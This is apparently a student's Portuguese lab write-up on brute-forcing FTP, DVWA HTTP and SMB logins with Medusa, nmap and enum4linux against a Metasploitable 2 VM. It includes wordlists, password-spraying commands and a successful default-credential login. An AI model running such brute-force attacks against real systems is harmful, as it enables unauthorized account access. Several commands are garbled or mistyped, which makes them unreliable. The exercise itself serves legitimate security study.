                          Desafio de Projeto - Simulando um Ataque de Brute Force 
                          de Senhas com Medusa e Kali Linux
                                                 
                                                
                                                Configurar o ambiente

Passo 1: fazer download dos Arquivos VMs

  •	Kali Linux: Baixei imagem iso do Kali Linux. 
  •	Baixei  Metasploitable 2 no SourceForge Metasploitable-Linux-2.0.0.zip.
   Passo 2: Configuração das Máquinas Virtuais no VirtualBox

Passo 3: Configuração de Rede (Opcional)

Para que as máquinas virtuais possam se comunicar, você pode usar diferentes 
configurações de rede no VirtualBox, dependendo do seu objetivo.

•	Feche ambas as VMs se estiverem abertas.
•	Para cada VM (Kali e Metasploitable), vá em Configurações > Rede.
•	Na Adaptador 1, habilite a opção.



                                Primeiro fazer o Ping da Máquina:

$ ping  –c 3 192.168.56.102




                           Prática de auditoria - Focando no serviço FTP
                           
$ nmap –sv  -p  21.22.80, 445,139 192.168.56.102

                                             Legenda
                                             
Sv – identifica a versão do serviço que roda cada porta, escaneando as portas 21,
22,80,445 e 139 que são portas comuns para o FTP, SSH, HTTP e Smb. Quando houver 
enter vai exibir se há ou não portas abertas.

192.168.56.102 – ip do alvo.


Se a porta 21 estiver aberta, saberá que a porta FTP está  habilitada.

                          Para saber se o serviço FTP está ativo basta digitar:

$ FTP  192.168.56.102 

Seguindo pelo ip do metspoitable 2 e se exibir a mensagem de boas vindas, indicará  
que o FTP está aceitando conexões.


                    Agora Criando nomes de usuários e senhas comuns em diferentes arquivos

$ echo -e “user\nmsfadmin\nroot” > users.txt
$ echo -e “123456\npassword\nqwerty\nmsfadmin” > pass.txt




                      Uso do comando Medusa para realizar o ataque
                      
$ medusa  -h  192.168.56.102  -U  users.txt  -p  pass.txt  -M  FTP  -t 6

Ela vai dizer e que achou comandos de senhas válidas ou não.

                       Agora validando acesso manualmente
                       
$ FTP   192.168.56.102  

 


                                Criando wordlists
                          
Automatizando o ataque
 
$ echo  -e  *user\nmsfadmin\nadmin\nroot*  >  users.txt
$ echo  -e  *123456\npassword\nqwerty\nmsadmin*  >  pass.txt
$ echo  -e  *user\nmsfadmin\nadmin\nroot*  >  users.txt


                       Usando o medusa para simular combinações entre usuários e senhas

$ medusa -h 192.168.56.102 -U  users.txt  -p  pass.txt -M http\
-m Page:  */DVWA/login.php*\
-m Form: *username=^user^&password=^pass^ &login=login
-m ‘Fail-login failed’  -t 6

                        Ataque em cadeia, enumeração Smb + Password Spraying

Acessando o Navegador firefox

Digite 192.168.56.102/DVWA/login.php  na barra de endereços do Navegador firefox

 
                      Simulação de um cenário comum em ambiente corporativo mal configurado

$ enum4linux -a 192.168.56.102 | tee enum4_output.txt
$ less  enum4_output.txt

                      
                      Criando a lista de usuários

$ echo -e “password\n123456\nwelcome 123\nmsfadmin * > senhas_spray.txt

$ less enum4_output.txt

$ echo -e “user\nmsfadmin\nwelcome 123\nmsfadmin” > senhas_spray.txt

                       Ataque com Medusa

$ medusa  -a  192.168.56.102  |  tee  enum4_output.txt
$ medusa  -h  192.168.56.102  -U  users.txt   -p   pass.txt  -M  http\
-m Page:   */DVWA/login.php*\
-m Form:  *username=^user^&password=^pass^ &login=login
-m ‘Fail-login failed’  -t 6

$ medusa -h 192.168.56.102 -U  Smb_users.txt  -p  senhas_spray.txt -M  smbnt -t 2 -T 50


                      Testando o acesso pelo smbclient

$ smbclient -L //192.168.56.102 -U msfadmin

Password for [ worxgroup\msfadmin]: msfadmin


Entrou !!



        
